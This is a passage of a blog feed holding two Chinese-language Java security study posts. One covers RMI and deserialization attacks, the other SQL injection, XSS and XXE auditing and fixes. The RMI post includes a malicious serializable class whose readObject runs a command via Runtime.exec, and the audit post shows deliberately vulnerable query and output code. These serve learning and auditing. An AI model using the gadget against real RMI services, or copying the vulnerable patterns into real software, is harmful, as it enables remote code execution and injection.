class="keyword">import</span> java.rmi.<span class="type">RemoteException</span>;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.<span class="type">UnicastRemoteObject</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ServicesImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="title">implements</span> <span class="title">Services</span> </span>&#123;</span><br><span class="line">    public <span class="type">ServicesImpl</span>() <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public <span class="type">Object</span> sendMessage(<span class="type">Message</span> msg) <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-创建服务端-amp-amp-注册中心"><a href="#3-创建服务端-amp-amp-注册中心" class="headerlink" title="3.创建服务端&amp;&amp;注册中心"></a>3.创建服务端&amp;&amp;注册中心</h4><p>创建一个RMI服务端，服务端和客户端需要有共同的接口。然后创建注册中心，启动 <code>RMI</code> 的注册服务。<strong>server端将实例化的服务端远程对象绑定到registry</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.AlreadyBoundException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.RemoteException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.LocateRegistry;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.Registry;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">            ServicesImpl obj = <span class="keyword">new</span> ServicesImpl();</span><br><span class="line">            Registry registry = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 创建Registry</span></span><br><span class="line">                registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">                System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Using existing registry"</span>);</span><br><span class="line">                registry = LocateRegistry.getRegistry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绑定远程对象到Registry</span></span><br><span class="line">            registry.bind(<span class="string">"Services"</span>, obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205801.png" alt></p><p><strong>注意:</strong>低版本的JDK中，server服务端和register注册中心可以不在一台服务器上，高版本则只能在一台服务器上。</p><h4 id="4-创建客户端"><a href="#4-创建客户端" class="headerlink" title="4.创建客户端"></a>4.创建客户端</h4><p>客户端与server和registry交互。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package me.mole.javarmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 获取远程对象的引用</span></span><br><span class="line">        Services services = (Services) registry.lookup(<span class="string">"Services"</span>);</span><br><span class="line">        VulObject malicious = <span class="keyword">new</span> VulObject();</span><br><span class="line">        malicious.setParam(<span class="string">"calc.exe"</span>);</span><br><span class="line">        malicious.setMessage(<span class="string">"hacked by m01e"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用远程对象的引用调用对应的方法</span></span><br><span class="line">        System.out.<span class="built_in">println</span>(services.sendMessage(malicious));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204205817.png" alt></p><p>我们在客户端这里创建一个恶意的命令执行的类VulObject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulObject</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7398165783113471324L</span>;</span><br><span class="line">    <span class="keyword">private</span> String param;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParam</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.param = param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="本地获取注册中心-反序列化点"><a href="#本地获取注册中心-反序列化点" class="headerlink" title="本地获取注册中心(反序列化点)"></a>本地获取注册中心(反序列化点)</h4><p>获取注册中心的两种方式。</p><ul><li>创建时获取:LocateRegistry#createRegistry</li><li>远程获取:LocateRegistry#getRegistry</li></ul><p>无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的RegistryImpl对象进行调用。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204152056.png" alt></p><p>我们这里分析下调用 <code>LocateRegistry</code> 类的 <code>getRegistry</code> 方法。</p><p>调用通过<code>getRegistry</code> 方法得到的<code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204144136.png" alt></p><p>这里首先通过<strong>newCall</strong>方法调用 TCPChannel 类的 createConnection 方法创建 socket 连接和注册服务通信。</p><p>然后通过<strong>writeObject</strong>方法先后写入bind方法序列化的参数值。</p><p>然后通过调用serviceCall 方法，获取到dispatcher，最后调用registry.RegistryImpl_Skel类的dispatch方法。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204200612.png" alt></p><p>var3是传递过来的int类型的参数，在这里有如下关系的对应：</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>​     根据参数来决定服务端与客户端调用的方法。这个过程中基于序列化和反序列化来进行通讯的。那么我们就可以寻找反序列化的点来进行攻击。</p><h4 id="调用rmi执行反序列化攻击"><a href="#调用rmi执行反序列化攻击" class="headerlink" title="调用rmi执行反序列化攻击"></a>调用rmi执行反序列化攻击</h4><p>首先启动注册服务，然后执行服务端，最后执行客户端。可以发现客户端能够成功调用服务端上的方法，实现远程方法调用。</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204210147.png" alt></p><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ul><li>服务端Clockmpl()继承Clock()创建对象。</li><li>服务端CLock()注册远程对象</li><li>客户端访问服务器b并查找相应远程对象。</li><li>服务端将stub(存根返回)客户端</li><li>客户端调用stub(存根)的方法</li><li>stub(存根)作为代理与服务端骨架通信//骨架作为服务端代理。</li><li>骨架代理调用Clockmpl相应方法。</li><li>骨架将结果返回给客户端的存根</li><li>存根返回给客户端。</li></ul><h5 id="P牛对注册中心的解释"><a href="#P牛对注册中心的解释" class="headerlink" title="P牛对注册中心的解释"></a>P牛对注册中心的解释</h5><p>​    RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调用。</p><h4 id="插一张先知的流程图"><a href="#插一张先知的流程图" class="headerlink" title="插一张先知的流程图"></a>插一张先知的流程图</h4><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/007S8ZIlly1gfz5kokqvgj30fe0if407.jpg" alt="img"></p><h3 id="RMI攻击手法"><a href="#RMI攻击手法" class="headerlink" title="RMI攻击手法"></a>RMI攻击手法</h3><p>先知社区上的一些总结，上图:</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/20200701101308-6810e0aa-bb40-1.png" alt="img"></p><p><strong>大致可以分为以下四类:</strong></p><ul><li>探测利用开放的RMI服务。 </li><li>基于RMI服务反序列化过程的攻击。</li><li>利用RMI的动态加载特性的攻击利用。</li><li>结合JNDI注入。</li></ul><p>我们主要学习RMI结合反序列化攻击的相关内容。</p><h4 id="基于RMI服务反序列化过程的攻击"><a href="#基于RMI服务反序列化过程的攻击" class="headerlink" title="基于RMI服务反序列化过程的攻击"></a>基于RMI服务反序列化过程的攻击</h4><p>RMI反序列化漏洞的存在必须包含两个条件：</p><ol><li>能够进行RMI通信</li><li>目标服务器引用了第三方存在反序列化漏洞的jar包</li></ol><p>注：复现的时候需要JDK8 121以下版本，121及以后加了白名单限制。</p><h4 id="利用RMI的动态加载特性的攻击利用"><a href="#利用RMI的动态加载特性的攻击利用" class="headerlink" title="利用RMI的动态加载特性的攻击利用"></a>利用RMI的动态加载特性的攻击利用</h4><h5 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet code=<span class="string">"HelloWorld.class"</span> codebase=<span class="string">"Applets"</span> <span class="built_in">width</span>=<span class="string">"800"</span> <span class="built_in">height</span>=<span class="string">"600"</span>&gt;</span><br><span class="line">&lt;/applet&gt;</span><br></pre></td></tr></table></figure><p>​     codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。</p><p>​     如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，动态加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p><p>​     在RMI中，我们可以通过codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p><strong>但是相对而言这种限制条件很严：</strong></p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li></ul><p>这里使用这位师傅打包好的代码学习:<a href="https://github.com/fa1c0n1/rmi-attack-demo" target="_blank" rel="noopener">https://github.com/fa1c0n1/rmi-attack-demo</a></p><h5 id="客户端动态加载"><a href="#客户端动态加载" class="headerlink" title="客户端动态加载"></a>客户端动态加载</h5><ul><li>创建HTTP服务器，作为动态加载代码的远程仓库。</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8000</span></span><br></pre></td></tr></table></figure><ul><li>服务端创建远程对象，<code>RMI Registry</code>启动并完成名称绑定，并设置<code>java.rmi.server.codebase</code>。</li></ul><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204220949.png" alt></p><ul><li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>，并根据服务器返回的<code>java.rmi.server.codebase</code>远程加载动态所需的类。</li></ul><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221009.png" alt></p><h5 id="服务端动态加载"><a href="#服务端动态加载" class="headerlink" title="服务端动态加载"></a>服务端动态加载</h5><p>恶意的客户端代码：</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210209010010.png" alt></p><p>受害服务端代码：</p><p><img src="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/QQ%E6%88%AA%E5%9B%BE20210204221040.png" alt></p><h4 id="结合JNDI注入"><a href="#结合JNDI注入" class="headerlink" title="结合JNDI注入"></a>结合JNDI注入</h4><p>放到后面再细说。。(学晕了)</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://payloads.info/2020/06/21/Java%E5%AE%89%E5%85%A8-RMI-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p><p><a href="https://xz.aliyun.com/t/8644" target="_blank" rel="noopener">https://xz.aliyun.com/t/8644</a></p><p><a href="https://xz.aliyun.com/t/8706" target="_blank" rel="noopener">https://xz.aliyun.com/t/8706</a></p><p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-RMI-README.md#6mltu7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RMI定义&quot;&gt;&lt;a href=&quot;#RMI定义&quot; class=&quot;headerlink&quot; title=&quot;RMI定义&quot;&gt;&lt;/a&gt;RMI定义&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Java远程调用，&lt;strong&gt;实现远程调用的应用程序编程接口&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="RMI" scheme="https://shu1l.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计之常见漏洞学习</title>
    <link href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</id>
    <published>2021-01-27T06:28:28.000Z</published>
    <updated>2021-08-20T14:04:57.680Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java代码审计中常见的一些漏洞学习总结以及一些审计思路。</p><h3 id="java项目分层"><a href="#java项目分层" class="headerlink" title="java项目分层"></a>java项目分层</h3><ul><li>视图层(View 视图)</li><li>控制层（Controller、Action控制层)</li><li>服务层(Service)</li><li>业务逻辑层BO(business object)</li><li>实体层(entity 实体对象、VO(value)object)值对象、模型层(bean)</li></ul><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><ul><li>Servlet是在Java Web容器上运行的小程序</li><li>Servlet3.0之前的版本都需要在web.xml中配置</li><li>Spring MVC框架就是基于Servlet技术实现的</li></ul><h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>本质是将用户的输入当做代码执行，程序将用户的输入拼接到了sql语句中，改变原来sql语句的语义造成攻击。</p><h3 id="常见的一些例子"><a href="#常见的一些例子" class="headerlink" title="常见的一些例子"></a><strong>常见的一些例子</strong></h3><p>DAO: 存在拼接的SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">"+id</span></span><br></pre></td></tr></table></figure><p>Hibernate框架</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.createQuery(<span class="string">"from Book where title like '%"</span> + userInput + <span class="string">"%' and pu</span></span><br><span class="line">blished = true<span class="string">")</span></span><br></pre></td></tr></table></figure><p>Mybatis框架</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> ‘%$&#123;title&#125;%’</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> ($&#123;<span class="keyword">id</span>&#125;)，</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘<span class="keyword">java</span>’ <span class="keyword">order</span> <span class="keyword">by</span> $&#123;<span class="built_in">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure><h3 id="审计方法"><a href="#审计方法" class="headerlink" title="审计方法"></a>审计方法</h3><p>​    对于sql注入来讲，只要是与数据库存在交互的地方，应用程序对用户的输入没有进行有效的过滤，都有可能存在SQL注入漏洞。</p><p>在实际环境中<strong>，中间件漏洞的sql注入漏洞可能更多：</strong></p><ul><li>Mybatis框架中的like、in和order by语句。</li><li>Hibernate框架中的createQuery()函数</li></ul><p>快速定位相关sql语句上下文，查看是否有显式过滤机制。</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li>参数化查询，使用java.sql.PreparedStatement来对数据库发起参数化查询。</li></ul>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stmt=conncetion.prepare<span class="constructor">Statement(<span class="params">sqlString</span>)</span>;</span><br><span class="line">stmt.set<span class="constructor">String(1,<span class="params">userName</span>)</span>;</span><br><span class="line">stmt.set<span class="constructor">String(2,<span class="params">itemName</span>)</span>;</span><br><span class="line">rs=stmt.execute<span class="constructor">Query()</span>;</span><br></pre></td></tr></table></figure><ul><li>使用预编译能够预防绝大多数SQL注入，<strong>java.sql.PreparedStatement代替java.sql.Statement</strong>,但对于order by后的不能用预编译进行处理，只能手动过滤。</li></ul>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">String sqlString = "select * from db<span class="emphasis">_user where username=? and password=?";</span></span><br><span class="line"><span class="emphasis">        PreparedStatement stmt = connection.prepareStatement(sqlString);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(1, username);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(2, pwd);</span></span><br><span class="line"><span class="emphasis">        ResultSet rs = stmt.executeQuery();</span></span><br><span class="line"><span class="emphasis">......</span></span><br></pre></td></tr></table></figure><ul><li>Mybatis的SQL配置中，采用<code>#</code>变量名称</li></ul><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><p>网站与后端交互的输入输出没有做好过滤，导致攻击者可以插入恶意js语句进行攻击。根据后端代码不同 ，大致可以分为反射型、存储型、DOM型</p><p>举例:</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/xss"</span>)</span><br><span class="line"><span class="keyword">public</span> ModelAndView xss(HttpServletRequest request,HttpServletResponse</span><br><span class="line">response) <span class="keyword">throws</span> ServletException,IOException&#123;</span><br><span class="line"> String name = request.getParameter(<span class="string">"name"</span>);</span><br><span class="line"> ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">"mmc"</span>);</span><br><span class="line"> mav.getModel().put(<span class="string">"uname"</span>, name);</span><br><span class="line"> <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里接收了用户输入的参数name，然后又直接输出到了页面，整个过程没有任何过滤，</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a><strong>存储型</strong></h3><p>根据已知的用户ID查询该用户的数据并显示在JSP页面上。如果存入的数据存在未经过滤的恶意js代码。就会造成xss攻击。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  <span class="built_in">..</span>.</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">"select * from users where id ="</span> + id);</span><br><span class="line">    String<span class="built_in"> address </span>= <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">        rs.next();</span><br><span class="line">       <span class="built_in"> address </span>= rs.getString(<span class="string">"address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="审计方法-1"><a href="#审计方法-1" class="headerlink" title="审计方法"></a>审计方法</h3><p>全局搜索用户的输入与输出，查找是否存在过滤。</p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><ul><li>配置全局过滤器web.xml</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">filter</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;XssFilter&lt;/<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;  </span><br><span class="line">    &lt;/<span class="keyword">filter</span>&gt;  </span><br><span class="line">    &lt;<span class="keyword">filter</span>-<span class="keyword">mapping</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;  </span></span><br><span class="line"><span class="comment">    &lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用commons.lang包，主要提供了字符串查找、替换、分割、去空白、去掉非法字符等等操作。有几个函数可以用来过滤。<ul><li>StringEscapeUtils.escapeHtml(string)，使用HTML实体，转义字符串中的字符。</li><li>StringEscapeUtils.escapeJavaScript(string)，使用JavaScript字符串规则转义字符串中的字符。</li></ul></li></ul><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h3><p>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><h3 id="审计方法-2"><a href="#审计方法-2" class="headerlink" title="审计方法"></a>审计方法</h3><p>XML解析一般在导入配置、数据传输接口等场景会用到，xml解析器是否禁用外部实体。</p><p>全局搜索如下函数:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span> </span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XPathEx</span></span><br></pre></td></tr></table></figure><h3 id="修复-2"><a href="#修复-2" class="headerlink" 